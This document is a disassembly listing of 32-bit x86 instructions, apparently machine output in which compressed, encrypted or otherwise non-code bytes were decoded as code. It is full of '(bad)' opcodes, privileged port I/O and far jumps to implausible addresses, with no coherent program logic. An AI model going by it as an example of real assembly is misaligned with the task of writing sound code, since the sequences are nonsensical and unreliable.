  40d15a:	cmp    edi,DWORD PTR [esi]
  40d15c:	cmp    al,0xa5
  40d15e:	lds    esi,FWORD PTR [esp+esi*4+0x2c]
  40d162:	cli    
  40d163:	push   ebx
  40d164:	adc    DWORD PTR [eax+0x18e9d8ef],ecx
  40d16a:	pop    ebp
  40d16b:	jge    0x40d12b
  40d16d:	fimul  DWORD PTR [eax-0x6d4202e8]
  40d173:	sbb    al,0x6
  40d175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d176:	pop    es
  40d177:	mov    eax,0x3c44f3dd
  40d17c:	xor    bh,BYTE PTR [edi+0x2a]
  40d17f:	stc    
  40d180:	lea    eax,[esi+0x5cb9f6ff]
  40d186:	mov    ebx,0xcffff07e
  40d18b:	out    dx,al
  40d18c:	in     al,0xf5
  40d18e:	out    dx,eax
  40d18f:	(bad)  
  40d190:	fs xchg edi,eax
  40d192:	mov    dh,0x5e
  40d194:	add    al,0x93
  40d196:	add    ebp,DWORD PTR [ebx+eiz*2+0x36]
  40d19a:	sti    
  40d19b:	addr16 jmp 0x40d1df
  40d19e:	xor    BYTE PTR [eax+edx*2+0x43],dh
  40d1a2:	xchg   BYTE PTR [esi-0x72],dl
  40d1a5:	jno    0x40d190
  40d1a7:	outs   dx,BYTE PTR ds:[esi]
  40d1a8:	inc    edi
  40d1a9:	sub    ecx,DWORD PTR [edi+0x23]
  40d1ac:	daa    
  40d1ad:	adc    bh,BYTE PTR [ebx]
  40d1af:	xsha256 (bad)
  40d1b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1b1:	xchg   ecx,eax
  40d1b2:	aas    
  40d1b3:	pop    ds
  40d1b4:	mov    ah,0xe8
  40d1b6:	out    0x3b,al
  40d1b8:	loope  0x40d213
  40d1ba:	inc    esp
  40d1bb:	outs   dx,BYTE PTR ds:[esi]
  40d1bc:	bound  edi,QWORD PTR [ebx]
  40d1be:	and    ch,bh
  40d1c0:	addr16 (bad) 
  40d1c2:	div    ah
  40d1c4:	cmp    edx,ebp
  40d1c6:	inc    esp
  40d1c7:	pop    ebp
  40d1c8:	push   0x592d897
  40d1cd:	xchg   esp,eax
  40d1ce:	das    
  40d1cf:	cmp    ch,BYTE PTR [eax+0x78dc0659]
  40d1d5:	cmp    eax,0x9a3ff921
  40d1da:	xchg   ecx,eax
  40d1db:	mov    dh,0x3c
  40d1dd:	dec    esi
  40d1de:	add    BYTE PTR [ebx+0x55b5d05f],ah
  40d1e4:	xor    bh,BYTE PTR [ebp+0x69360b19]
  40d1ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1eb:	xchg   BYTE PTR [eax],al
  40d1ed:	gs pop edi
  40d1ef:	push   ds
  40d1f0:	loop   0x40d1c5
  40d1f2:	xlat   BYTE PTR ds:[ebx]
  40d1f3:	ror    BYTE PTR [ebx+ebp*4],0x69
  40d1f7:	pop    eax
  40d1f8:	or     BYTE PTR [eax+0x40],al
  40d1fb:	pop    edi
  40d1fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1fd:	jno    0x40d1dd
  40d1ff:	outs   dx,BYTE PTR ds:[esi]
  40d200:	out    0xd4,al
  40d202:	js     0x40d23d
  40d204:	or     DWORD PTR [edi+esi*2-0x5fbb92b2],0x60
  40d20c:	push   edi
  40d20d:	into   
  40d20e:	outs   dx,DWORD PTR ds:[esi]
  40d20f:	add    bh,BYTE PTR [eax+0x4e]
  40d212:	(bad)  
  40d213:	stc    
  40d214:	test   BYTE PTR [ecx+0x72],0x64
  40d218:	arpl   WORD PTR [ebx-0x6a],dx
  40d21b:	lahf   
  40d21c:	and    bh,BYTE PTR [edx+0x86a0e1e]
  40d222:	sub    DWORD PTR [edi+ebx*1-0x1e5d6b26],0x4d
  40d22a:	in     al,dx
  40d22b:	outs   dx,DWORD PTR ds:[esi]
  40d22c:	pop    ebx
  40d22d:	(bad)  [esi-0x6a]
  40d230:	loope  0x40d295
  40d232:	loopne 0x40d21f
  40d234:	bound  ebp,QWORD PTR [eax+0x35]
  40d237:	sbb    al,0xf2
  40d239:	ret    0xa7b9
  40d23c:	push   esi
  40d23d:	inc    ecx
  40d23e:	ret    
  40d23f:	mov    ds:0xf7c000ea,eax
  40d244:	int    0xbd
  40d246:	out    0x95,al
  40d248:	fcomi  st,st(0)
  40d24a:	or     DWORD PTR ds:0xdf3ff1fe,esp
  40d250:	aaa    
  40d251:	mov    ebx,0x572379b5
  40d256:	cmp    BYTE PTR fs:[eax+0x50e738f],0x2e
  40d25e:	fcomp  QWORD PTR [ebx+0x24]
  40d261:	ror    DWORD PTR [ecx-0x30b42f75],cl
  40d267:	bound  esp,QWORD PTR ds:0x53f57337
  40d26d:	dec    ecx
  40d26e:	push   ds
  40d26f:	or     BYTE PTR gs:[ecx],bh
  40d272:	xor    DWORD PTR [ebp+0x59],0x1f
  40d276:	xor    DWORD PTR [edi+0x5c9ba70f],esp
  40d27c:	fstp   TBYTE PTR [esi-0x2a]
  40d27f:	or     DWORD PTR [ebp+0x441843fb],eax
  40d285:	popf   
  40d286:	cs push ebp
  40d288:	in     eax,0xd9
  40d28a:	mov    eax,0xfb7bc9f1
  40d28f:	cld    
  40d290:	push   edx
  40d291:	(bad)  
  40d292:	sub    cl,BYTE PTR [edi-0x80]
  40d295:	loop   0x40d28f
  40d297:	(bad)  
  40d298:	mov    es:0xf2d76cb4,al
  40d29e:	or     DWORD PTR ds:0xf35e1322,0xffffff85
  40d2a5:	(bad)  
  40d2a6:	(bad)  
  40d2a8:	ret    
  40d2a9:	ret    0x4fe3
  40d2ac:	mov    ebx,0x3d1d5c43
  40d2b1:	imul   edx,DWORD PTR [ebp+0x53fa7c97],0x69
  40d2b8:	sub    al,0x5
  40d2ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2bb:	test   DWORD PTR [edx-0x65],ebp
  40d2be:	mov    ch,BYTE PTR [ebx-0x628d056e]
  40d2c4:	in     al,dx
  40d2c5:	pop    esp
  40d2c6:	pop    edx
  40d2c7:	pop    eax
  40d2c8:	and    bl,bh
  40d2ca:	ficom  WORD PTR [ecx+0x50]
  40d2cd:	mov    bl,0xbc
  40d2cf:	pop    ds
  40d2d0:	in     al,dx
  40d2d1:	cmp    DWORD PTR [ebx],0xffffff9a
  40d2d4:	(bad)  
  40d2d5:	out    dx,eax
  40d2d6:	leave  
  40d2d7:	popa   
  40d2d8:	dec    edi
  40d2d9:	sub    ebp,DWORD PTR [edx+0xf8f3211]
  40d2df:	test   eax,0xf3c1dc66
  40d2e4:	xchg   DWORD PTR [esi],eax
  40d2e6:	pop    esp
  40d2e7:	push   ecx
  40d2e8:	adc    al,0xe9
  40d2ea:	push   eax
  40d2eb:	fwait
  40d2ec:	adc    al,0x43
  40d2ee:	mov    ebp,0x24f629bd
  40d2f3:	jl     0x40d306
  40d2f5:	sub    DWORD PTR [esi+0x36],0xa5b1bf65
  40d2fc:	sbb    dl,bl
  40d2fe:	sub    bx,WORD PTR [ebx+edx*4+0x19]
  40d303:	sub    BYTE PTR [ecx],0xd0
  40d306:	outs   dx,BYTE PTR ds:[esi]
  40d307:	jo     0x40d382
  40d309:	jns    0x40d358
  40d30b:	(bad)  
  40d30c:	mov    ds:0x918206f0,al
  40d311:	mov    cl,0x95
  40d313:	dec    eax
  40d314:	out    0x30,al
  40d316:	std    
  40d317:	mov    edi,0x2ff942c1
  40d31c:	pop    ss
  40d31d:	xor    esp,DWORD PTR [ebp+0x76]
  40d320:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40d322:	mov    ebp,0xeec496a8
  40d327:	and    bh,dh
  40d329:	sub    edi,DWORD PTR cs:[edi]
  40d32c:	inc    ecx
  40d32d:	jge    0x40d397
  40d32f:	pop    esi
  40d330:	mov    esp,0x55d80728
  40d335:	xchg   ah,dl
  40d337:	fmul   DWORD PTR [ebp-0xa]
  40d33a:	retf   
  40d33b:	mov    eax,ds:0xa0ed543a
  40d340:	mov    cs,WORD PTR [ebx+eax*2+0x44]
  40d344:	lea    edi,[edx+eax*1]
  40d347:	dec    ebp
  40d348:	sub    eax,0x5047b826
  40d34d:	xchg   edx,eax
  40d34e:	and    edx,DWORD PTR [edx]
  40d350:	mov    edx,0x17ccc6a8
  40d355:	sbb    edx,DWORD PTR [ebx-0x4743b34]
  40d35b:	in     eax,dx
  40d35c:	xor    edi,esi
  40d35e:	imul   esp,DWORD PTR [esi+ebp*8],0x3b
  40d362:	data16 clc 
  40d364:	retf   
  40d365:	fmul   st,st(2)
  40d367:	xchg   edi,eax
  40d368:	sbb    al,0xd6
  40d36a:	sub    eax,0xafa24fab
  40d36f:	sbb    al,0x64
  40d371:	setl   BYTE PTR [edx-0x7f]
  40d375:	outs   dx,DWORD PTR ds:[esi]
  40d376:	mov    ecx,0x4f1f05d2
  40d37b:	loope  0x40d32a
  40d37d:	add    ecx,DWORD PTR [edx-0x284330d4]
  40d383:	mov    ah,0x69
  40d385:	and    ebp,DWORD PTR [edx+0x6b]
  40d388:	cld    
  40d389:	arpl   WORD PTR [edi-0x45b928e2],dx
  40d38f:	pop    ecx
  40d390:	mov    BYTE PTR [ebx],dh
  40d392:	adc    al,BYTE PTR [ecx]
  40d394:	cs jno 0x40d3fb
  40d397:	imul   ebp,DWORD PTR [edx-0x53],0xf184b1e2
  40d39e:	in     eax,0x6b
  40d3a0:	add    bl,BYTE PTR [eax+0x69245876]
  40d3a6:	mov    ebp,0x56cfe11b
  40d3ab:	pop    esi
  40d3ac:	test   BYTE PTR [edi+esi*8],0xed
  40d3b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3b1:	adc    al,0xbb
  40d3b3:	int3   
  40d3b4:	mov    ah,BYTE PTR ds:0xf6e9a236
  40d3ba:	adc    edx,edx
  40d3bc:	mov    ebp,0x53d53b72
  40d3c1:	mov    esi,0xc5aaa33f
  40d3c6:	call   0xff56eeb7
  40d3cb:	or     BYTE PTR [ebx+0x5e],al
  40d3ce:	pusha  
  40d3cf:	sub    eax,0xa099b6c2
  40d3d4:	clc    
  40d3d5:	or     DWORD PTR [ebx-0x7a072220],edi
  40d3db:	xchg   DWORD PTR [eax],ebp
  40d3dd:	das    
  40d3de:	pop    ebx
  40d3df:	aam    0xde
  40d3e1:	xchg   DWORD PTR [ecx+0x24],esp
  40d3e4:	pop    ss
  40d3e5:	mov    dh,0x9a
  40d3e8:	fst    DWORD PTR cs:[esi+0x72]
  40d3ec:	xor    ebp,DWORD PTR [edi+0x168602df]
  40d3f2:	(bad)  
  40d3f3:	xor    bl,dl
  40d3f5:	xchg   esp,eax
  40d3f6:	dec    esp
  40d3f7:	into   
  40d3f8:	pushf  
  40d3f9:	sub    dl,BYTE PTR [eax-0x7ad178eb]
  40d3ff:	inc    eax
  40d400:	mov    bl,BYTE PTR [edx]
  40d402:	pop    ecx
  40d403:	fisub  WORD PTR [ebx]
  40d405:	sahf   
  40d406:	fstp   st(6)
  40d408:	ss aas 
  40d40a:	repnz mov edx,edx
  40d40d:	dec    esp
  40d40e:	arpl   WORD PTR [ebx-0x4a],bx
  40d411:	int3   
  40d412:	out    0xfb,al
  40d414:	es out 0xc3,eax
  40d417:	pop    ds
  40d418:	adc    eax,0x583dc0d9
  40d41d:	sub    ebp,DWORD PTR [edx+0x4924a76f]
  40d423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d424:	xor    esp,DWORD PTR [eax-0x69]
  40d427:	sub    esp,ebx
  40d429:	push   ebx
  40d42a:	or     edi,DWORD PTR [ebx-0x27]
  40d42d:	jle    0x40d3bd
  40d42f:	adc    eax,0x54cb280e
  40d434:	das    
  40d435:	cmp    eax,0x1f6a6ab7
  40d43a:	push   edi
  40d43b:	pushf  
  40d43c:	mov    ecx,ebp
  40d43e:	xor    bh,BYTE PTR [ebp-0x25]
  40d441:	out    dx,eax
  40d442:	mov    ch,0xc7
  40d444:	jo     0x40d3f6
  40d446:	sbb    esi,DWORD PTR [edx-0x4a525898]
  40d44c:	int3   
  40d44d:	clc    
  40d44e:	rcr    BYTE PTR gs:[edi-0x6deb8512],1
  40d455:	out    dx,al
  40d456:	xor    ch,BYTE PTR [edx]
  40d458:	inc    edi
  40d459:	(bad)  
  40d45a:	pusha  
  40d45b:	mov    edx,0xde034ea7
  40d460:	dec    eax
  40d461:	jns    0x40d4d9
  40d463:	dec    edi
  40d464:	mov    ebp,0x353e1724
  40d469:	pop    ecx
  40d46a:	mov    edx,DWORD PTR [edx]
  40d46c:	inc    esp
  40d46d:	dec    bl
  40d46f:	(bad)  
  40d470:	xlat   BYTE PTR ds:[ebx]
  40d471:	loop   0x40d426
  40d473:	mov    cl,0xc1
  40d475:	jl     0x40d437
  40d477:	fcomp  QWORD PTR [ecx+0x79]
  40d47a:	push   esi
  40d47b:	dec    esi
  40d47c:	jne    0x40d4e6
  40d47e:	pop    ecx
  40d47f:	pop    ecx
  40d480:	xchg   edx,eax
  40d481:	stos   BYTE PTR es:[edi],al
  40d482:	mov    ch,BYTE PTR [esi]
  40d484:	or     ecx,edi
  40d486:	retf   0x58c7
  40d489:	adc    BYTE PTR [bp+si+0x18d3],ah
  40d48e:	or     eax,0x2f0bdaf
  40d493:	sti    
  40d494:	fucomp st(1)
  40d496:	ins    BYTE PTR es:[edi],dx
  40d497:	stos   BYTE PTR es:[edi],al
  40d498:	and    BYTE PTR [esi+0x7d],dh
  40d49b:	lock and eax,0x251be788
  40d4a1:	mov    ecx,0xf073bcd1
  40d4a6:	mov    ecx,0x27808b02
  40d4ab:	(bad)  
  40d4ac:	int    0x54
  40d4ae:	add    al,0xb5
  40d4b0:	(bad)  
  40d4b1:	aad    0x73
  40d4b3:	adc    eax,0x8bc04f94
  40d4b8:	arpl   WORD PTR [ecx-0x77],sp
  40d4bb:	xchg   al,bl
  40d4bd:	cmp    al,0x2c
  40d4bf:	ins    BYTE PTR es:[edi],dx
  40d4c0:	adc    DWORD PTR [esi],0xffffffb0
  40d4c3:	lock cmp ebx,DWORD PTR [ebx]
  40d4c6:	(bad)  
  40d4c8:	out    dx,eax
  40d4c9:	push   esp
  40d4ca:	pop    ss
  40d4cb:	pop    edx
  40d4cc:	sbb    al,0x91
  40d4ce:	push   0x1d
  40d4d0:	arpl   WORD PTR [ecx+0x72],di
  40d4d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4d4:	cmp    dl,bh
  40d4d6:	xchg   BYTE PTR [ebx+0x45784388],dh
  40d4dc:	pusha  
  40d4dd:	scas   al,BYTE PTR es:[edi]
  40d4de:	cmp    esp,DWORD PTR [edx-0x3f2f2781]
  40d4e4:	mul    DWORD PTR [edx+edi*4-0x7642861a]
  40d4eb:	addr16 jo 0x40d4d9
  40d4ee:	fidiv  WORD PTR [edi]
  40d4f0:	xchg   ecx,eax
  40d4f1:	pop    ds
  40d4f2:	cmp    bl,ch
  40d4f4:	mov    ch,0xf8
  40d4f6:	out    dx,al
  40d4f7:	xbegin 0x3087d54f
  40d4fd:	cs and dl,bl
  40d500:	mov    ds:0xb8d228d0,eax
  40d505:	pop    edx
  40d506:	test   al,0x1
  40d508:	cmp    edi,ecx
  40d50a:	mov    edx,0x2d3b35dc
  40d50f:	sub    eax,0xd0f9acf
  40d514:	lahf   
  40d515:	outs   dx,DWORD PTR ds:[esi]
  40d516:	or     esp,esp
  40d518:	adc    al,BYTE PTR [ecx-0x75f786c7]
  40d51e:	lods   eax,DWORD PTR ds:[esi]
  40d51f:	dec    edx
  40d520:	xor    BYTE PTR [ebx],0x90
  40d523:	(bad)  
  40d524:	pusha  
  40d525:	mov    esp,0x2f24c594
  40d52a:	push   ebx
  40d52b:	sub    BYTE PTR [edi+ebx*8+0x6b],ch
  40d52f:	pop    ss
  40d530:	cld    
  40d531:	mov    ebp,es
  40d533:	retf   0x42e8
  40d536:	bound  ebp,QWORD PTR [edi-0x7c6cc610]
  40d53c:	scas   eax,DWORD PTR es:[edi]
  40d53d:	inc    ebp
  40d53e:	and    eax,0x82e9f02d
  40d543:	lea    eax,[ebx-0x6f4fafb2]
  40d549:	dec    edx
  40d54a:	mov    cl,0xee
  40d54c:	xor    ecx,DWORD PTR [ecx+0x2b]
  40d54f:	or     eax,0x17a0c4bc
  40d554:	xchg   edx,eax
  40d555:	push   ebp
  40d556:	lahf   
  40d557:	cmp    edx,DWORD PTR [edx-0x7d2310f2]
  40d55d:	dec    eax
  40d55e:	out    0xb,al
  40d560:	hlt    
  40d561:	adc    ch,BYTE PTR [esi-0xe]
  40d564:	(bad)  
  40d565:	(bad)  
  40d566:	pop    ebx
  40d567:	dec    edi
  40d568:	(bad)  
  40d569:	je     0x40d540
  40d56b:	jecxz  0x40d58b
  40d56d:	pop    ebp
  40d56e:	jnp    0x40d526
  40d570:	sbb    eax,0x793d0eaa
  40d576:	and    eax,DWORD PTR [ebp+0x13]
  40d579:	jnp    0x40d5ea
  40d57b:	sbb    eax,0xd2261a35
  40d580:	cli    
  40d581:	push   es
  40d582:	loopne 0x40d521
  40d584:	stos   DWORD PTR es:[edi],eax
  40d585:	mov    al,ds:0x17372de1
  40d58a:	sub    DWORD PTR [eax-0x2c2bd287],0x33e4930b
  40d594:	ret    
  40d595:	int3   
  40d596:	push   edx
  40d597:	lahf   
  40d598:	push   ds
  40d599:	mov    dh,0x7a
  40d59b:	push   es
  40d59c:	repnz retf 0x50a0
  40d5a0:	mov    bh,0xb7
  40d5a2:	inc    ebp
  40d5a3:	inc    ecx
  40d5a4:	icebp  
  40d5a5:	scas   al,BYTE PTR es:[di]
  40d5a7:	xchg   ebp,eax
  40d5a8:	add    ah,ah
  40d5aa:	stc    
  40d5ab:	fisttp QWORD PTR [esi-0x50813cea]
  40d5b1:	fwait
  40d5b2:	and    al,0xad
  40d5b4:	int    0x7d
  40d5b6:	mov    esp,0x29d07f7b
  40d5bb:	loopne 0x40d575
  40d5bd:	mov    esi,?
  40d5bf:	sbb    BYTE PTR [esi+0x238c1c28],cl
  40d5c5:	loope  0x40d5e2
  40d5c7:	mov    ds:0xacc18c58,al
  40d5cc:	or     DWORD PTR [eax-0x39],esp
  40d5cf:	gs mov cl,0x63
  40d5d2:	das    
  40d5d3:	fdivr  st(7),st
  40d5d5:	inc    ecx
  40d5d6:	add    esp,DWORD PTR [edx-0x14]
  40d5d9:	pop    ds
  40d5da:	push   ebp
  40d5db:	xchg   DWORD PTR [ebx],ebx
  40d5dd:	lahf   
  40d5de:	push   esp
  40d5df:	sub    ah,BYTE PTR [edi-0x28640673]
  40d5e5:	dec    eax
  40d5e6:	inc    ebp
  40d5e7:	pop    edx
  40d5e8:	fist   DWORD PTR [ebx]
  40d5ea:	scas   al,BYTE PTR es:[edi]
  40d5eb:	mov    bl,0x26
  40d5ed:	jmp    0x5530:0x83e2e5ff
  40d5f4:	add    bl,BYTE PTR [esi]
  40d5f6:	dec    ebx
  40d5f7:	jne    0x40d5b7
  40d5f9:	(bad)  
  40d5fa:	mov    ah,0xa9
  40d5fc:	dec    esp
  40d5fd:	mov    ebp,0x995ebd7c
  40d602:	dec    DWORD PTR [ebx+ecx*8]
  40d605:	or     ebx,ecx
  40d607:	cmp    al,0xea
  40d609:	sbb    edx,DWORD PTR [ecx+ecx*1-0xa]
  40d60d:	sahf   
  40d60e:	jo     0x40d5bf
  40d610:	xchg   edx,eax
  40d611:	idiv   DWORD PTR [ebp-0x36]
  40d614:	xchg   ebx,eax
  40d615:	push   esp
  40d616:	inc    edi
  40d617:	jmp    0x6274a99b
  40d61c:	ss daa 
  40d61e:	mov    bl,0x9
  40d620:	or     BYTE PTR [esi+0x4],0xcf
  40d624:	retf   
  40d625:	pandn  mm7,QWORD PTR fs:[esi-0x798d566a]
  40d62d:	cmp    ebp,DWORD PTR [ebx+0xe]
  40d630:	lea    eax,ds:0x1ef0b55c
  40d636:	mov    cl,0x67
  40d638:	dec    ebx
  40d639:	icebp  
  40d63a:	inc    BYTE PTR cs:0x416ec69b
  40d641:	imul   BYTE PTR [eax-0x740d3781]
  40d647:	mov    ah,0x89
  40d649:	cwde   
  40d64a:	mov    DWORD PTR [eax],ecx
  40d64c:	sbb    cl,0x36
  40d64f:	xchg   ebp,eax
  40d650:	jmp    0x40d682
  40d652:	push   edx
  40d653:	ins    DWORD PTR es:[edi],dx
  40d654:	pop    ss
  40d655:	cmp    DWORD PTR [ebp-0x1c],0xffffffa8
  40d659:	dec    ebx
  40d65a:	dec    ebp
  40d65b:	fsubr  QWORD PTR [ebx-0x6a270226]
  40d661:	daa    
  40d662:	mov    ah,0x49
  40d664:	shrd   DWORD PTR [ebx],edi,0x83
  40d668:	xchg   DWORD PTR [edx],esi
  40d66a:	inc    esp
  40d66b:	xor    esp,DWORD PTR [esi+0x74]
  40d66e:	sahf   
  40d66f:	and    edx,ebx
  40d671:	push   edi
  40d672:	aaa    
  40d673:	jge    0x40d61f
  40d675:	dec    ebp
  40d676:	add    al,0x50
  40d678:	cmc    
  40d679:	jmp    0x7bd0d30a
  40d67e:	sti    
  40d67f:	and    al,0x83
  40d681:	rcr    BYTE PTR [edi-0x29],0x73
  40d685:	xchg   ecx,eax
  40d686:	call   0xd514:0xd4e8bee8
  40d68d:	inc    ebp
  40d68e:	xor    eax,0xa6852145
  40d693:	push   esp
  40d694:	pop    ds
  40d695:	pop    esp
  40d696:	xor    bl,BYTE PTR [ecx-0x4d]
  40d699:	and    bh,BYTE PTR [edi-0x68d424eb]
  40d69f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6a0:	aad    0x26
  40d6a2:	xchg   ecx,eax
  40d6a3:	jnp    0x40d6ae
  40d6a5:	(bad)  
  40d6a6:	lods   eax,DWORD PTR ds:[esi]
  40d6a7:	cdq    
  40d6a8:	mov    cl,0x99
  40d6aa:	inc    edx
  40d6ab:	fisub  DWORD PTR [esi+eax*2]
  40d6ae:	inc    eax
  40d6af:	adc    ebp,edx
  40d6b1:	aam    0xd1
  40d6b3:	xchg   ecx,eax
  40d6b4:	hlt    
  40d6b5:	xor    esi,DWORD PTR [ebp-0xd]
  40d6b8:	add    al,0xd3
  40d6ba:	ins    DWORD PTR es:[edi],dx
  40d6bb:	mov    al,ds:0x3b1b1464
  40d6c0:	es and ecx,eax
  40d6c3:	xchg   edx,eax
  40d6c4:	test   eax,edx
  40d6c6:	fild   DWORD PTR [ebx]
  40d6c8:	js     0x40d6f1
  40d6ca:	pop    edx
  40d6cb:	sub    al,0xfc
  40d6cd:	add    dh,ah
  40d6cf:	cli    
  40d6d0:	scas   al,BYTE PTR es:[edi]
  40d6d1:	popa   
  40d6d2:	out    dx,eax
  40d6d3:	xchg   DWORD PTR [eax-0x55],ecx
  40d6d6:	sar    esp,cl
  40d6d8:	dec    ebp
  40d6d9:	add    ch,BYTE PTR [ebx+0x6c0cf533]
  40d6df:	lds    edi,FWORD PTR [ebx]
  40d6e1:	(bad)
  40d6e4:	frndint 
  40d6e6:	dec    esp
  40d6e7:	mov    ebp,0xefe593bc
  40d6ec:	push   ds
  40d6ed:	lods   eax,DWORD PTR ds:[esi]
  40d6ee:	iret   
  40d6ef:	hlt    
  40d6f0:	outs   dx,BYTE PTR ds:[esi]
  40d6f1:	dec    ebx
  40d6f2:	dec    eax
  40d6f3:	fmul   DWORD PTR [eax-0xf]
  40d6f6:	ss ss xchg edi,eax
  40d6f9:	(bad)  
  40d6fa:	mov    bh,0x1d
  40d6fc:	and    bl,BYTE PTR ds:0x7ee54a2d
  40d702:	push   esi
  40d703:	cs pop ss
  40d705:	arpl   sp,bp
  40d707:	imul   esi,ebx,0xd541019
  40d70d:	jl     0x40d77e
  40d70f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d710:	fs std 
  40d712:	adc    cl,BYTE PTR [edi+0x49]
  40d715:	mov    bh,0xd6
  40d717:	test   DWORD PTR [edi-0x35],0xfee49ed5
  40d71e:	mov    al,ds:0xa0910bbf
  40d723:	dec    ebx
  40d724:	jle    0x40d6dc
  40d726:	je     0x40d6bc
  40d728:	cdq    
  40d729:	dec    eax
  40d72a:	dec    esp
  40d72b:	push   edi
  40d72c:	or     eax,0x1e997af5
  40d731:	lahf   
  40d732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d733:	pushf  
  40d734:	dec    eax
  40d735:	out    0xc7,eax
  40d737:	pop    esp
  40d738:	push   0xb862e432
  40d73d:	scas   eax,DWORD PTR es:[edi]
  40d73e:	sbb    edx,DWORD PTR [ebx-0x77]
  40d741:	repz mov al,0x9f
  40d744:	or     dl,cl
  40d746:	(bad)  
  40d747:	popa   
  40d748:	push   es
  40d749:	popf   
  40d74a:	rol    DWORD PTR [esi],cl
  40d74c:	or     dh,al
  40d74e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d74f:	inc    eax
  40d750:	jmp    0x8258:0xad92c124
  40d757:	outs   dx,DWORD PTR ds:[esi]
  40d758:	aad    0x2f
  40d75a:	xchg   esi,eax
  40d75b:	add    BYTE PTR [ebx+eax*4],dh
  40d75e:	outs   dx,BYTE PTR ds:[esi]
  40d75f:	or     BYTE PTR [ebx+0x70b35f57],0xff
  40d766:	push   ebx
  40d767:	ins    BYTE PTR es:[edi],dx
  40d768:	push   ss
  40d769:	jnp    0x40d79c
  40d76b:	dec    edx
  40d76c:	add    al,0xdf
  40d76e:	and    dh,BYTE PTR [bp+si+0x63c2]
  40d773:	mov    ds,WORD PTR [ebp+0x6eba5b3e]
  40d779:	add    edx,DWORD PTR [ecx+0x794aa74c]
  40d77f:	lock sbb BYTE PTR ds:[esi+esi*1-0x3f1df14a],cl
  40d788:	ins    DWORD PTR es:[edi],dx
  40d789:	gs and eax,0x627bc1d9
  40d78f:	jns    0x40d7cd
  40d791:	jle    0x40d752
  40d793:	jmp    0x40d73e
  40d795:	pusha  
  40d796:	inc    esp
  40d797:	xor    DWORD PTR [ecx-0x3120298b],0x19bb8162
  40d7a1:	jge    0x40d768
  40d7a3:	xlat   BYTE PTR ds:[ebx]
  40d7a4:	and    eax,0xd5a87c89
  40d7a9:	dec    esp
  40d7aa:	mov    esp,0x72df4c3b
  40d7af:	pop    edi
  40d7b0:	aad    0x62
  40d7b2:	push   0x1f1c7ccd
  40d7b7:	adc    BYTE PTR [edx-0x297bede],cl
  40d7bd:	xor    DWORD PTR [esi-0x1e068d2a],ebp
  40d7c3:	push   ebx
  40d7c4:	xchg   edi,eax
  40d7c5:	pop    ebx
  40d7c6:	inc    edx
  40d7c7:	xor    eax,0x4705db43
  40d7cc:	xor    esp,ebx
  40d7ce:	das    
  40d7cf:	dec    esi
  40d7d0:	xor    ebp,esp
  40d7d2:	sbb    ch,ch
  40d7d4:	pop    DWORD PTR [edx]
  40d7d6:	loope  0x40d800
  40d7d8:	stos   BYTE PTR es:[edi],al
  40d7d9:	mul    DWORD PTR fs:[ebp+0x59]
  40d7dd:	push   ds
  40d7de:	jg     0x40d7f7
  40d7e0:	lock and cl,BYTE PTR [ebx]
  40d7e3:	dec    edi
  40d7e4:	loop   0x40d7ac
  40d7e6:	and    ah,BYTE PTR [esp+edx*4+0x69]
  40d7ea:	add    BYTE PTR [eax],dh
  40d7ec:	and    bl,cl
  40d7ee:	loop   0x40d790
  40d7f0:	retf   0xa208
  40d7f3:	inc    ecx
  40d7f4:	jbe    0x40d868
  40d7f6:	adc    al,0x32
  40d7f8:	arpl   WORD PTR [ebp-0x11],dx
  40d7fb:	(bad)  
  40d7fc:	nop
  40d7fd:	adc    DWORD PTR [edi-0x59],ecx
  40d800:	inc    edx
  40d801:	sbb    eax,DWORD PTR [edx]
  40d803:	fstp   TBYTE PTR [ecx]
  40d805:	repz sti 
  40d807:	mov    bl,0xf8
  40d809:	xor    ebp,ebp
  40d80b:	inc    eax
  40d80c:	ss aaa 
  40d80e:	ss sub al,0xdf
  40d811:	aaa    
  40d812:	or     eax,0x946f84f9
  40d817:	sub    ah,BYTE PTR [eax]
  40d819:	xor    DWORD PTR [ebp+0x1b],0xffffffad
  40d81d:	in     eax,0xee
  40d81f:	fisttp DWORD PTR [ecx]
  40d821:	popf   
  40d822:	jb     0x40d818
  40d824:	mov    ss,WORD PTR [ebx+0x5ffb6f76]
  40d82a:	xor    edx,edx
  40d82c:	ins    DWORD PTR es:[edi],dx
  40d82d:	mov    ecx,0xd3d1a610
  40d832:	mov    ss,eax
  40d834:	shl    BYTE PTR [eiz*1-0x5a94a98c],1
  40d83b:	jmp    0x40d849
  40d83d:	mov    eax,ds:0x5f323732
  40d842:	out    dx,al
  40d843:	add    BYTE PTR [edx-0xa67da9f],ah
  40d849:	add    al,0xd5
  40d84b:	gs mov edx,0x8ad0dd48
  40d851:	pop    ss
  40d852:	xchg   esp,eax
  40d853:	sbb    DWORD PTR [ecx-0x7e8c8e1e],esp
  40d859:	daa    
  40d85a:	mov    ?,WORD PTR [edi]
  40d85c:	sub    DWORD PTR [edx],esi
  40d85e:	adc    dl,0x41
  40d861:	loop   0x40d85b
  40d863:	jge    0x40d8a0
  40d865:	push   ebx
  40d866:	adc    esp,DWORD PTR [edx-0x3b9efcf7]
  40d86c:	cmp    eax,0xf81b3256
  40d871:	hlt    
  40d872:	mov    ah,0x32
  40d874:	retf   
  40d875:	shl    eax,cl
  40d877:	mov    bh,0x38
  40d87a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d87b:	enter  0x2553,0xa4
  40d87f:	aas    
  40d880:	clc    
  40d881:	add    al,0x21
  40d883:	(bad)  
  40d884:	lods   al,BYTE PTR ds:[esi]
  40d885:	jecxz  0x40d8f5
  40d887:	ins    BYTE PTR es:[edi],dx
  40d888:	jbe    0x40d85c
  40d88a:	ret    
  40d88b:	into   
